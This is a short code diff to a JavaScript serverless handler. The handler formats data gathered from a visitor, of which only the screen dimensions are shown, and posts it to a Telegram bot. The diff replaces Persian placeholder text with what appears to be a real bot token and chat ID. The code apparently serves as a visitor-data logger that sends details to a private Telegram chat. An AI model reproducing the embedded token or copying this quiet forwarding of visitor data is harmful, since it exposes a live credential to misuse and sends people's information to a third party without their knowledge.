@@ -47,12 +47,12 @@ module.exports = async (req, res) => {
 🖼️ Screen: ${data.screen.width}x${data.screen.height}
   `;
 
-  const tgURL = `https://api.telegram.org/botتوکن_ربات/sendMessage`;
+  const tgURL = `https://api.telegram.org/bot6589370434:AAGm4atc0M_TtErJfXF-Bu2UByHPX8UukY8/sendMessage`;
 
   await fetch(tgURL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: 'شناسه_چت', text: message })
+    body: JSON.stringify({ chat_id: '1848591768', text: message })
   });
 
   res.status(200).json({ status: 'ok' });
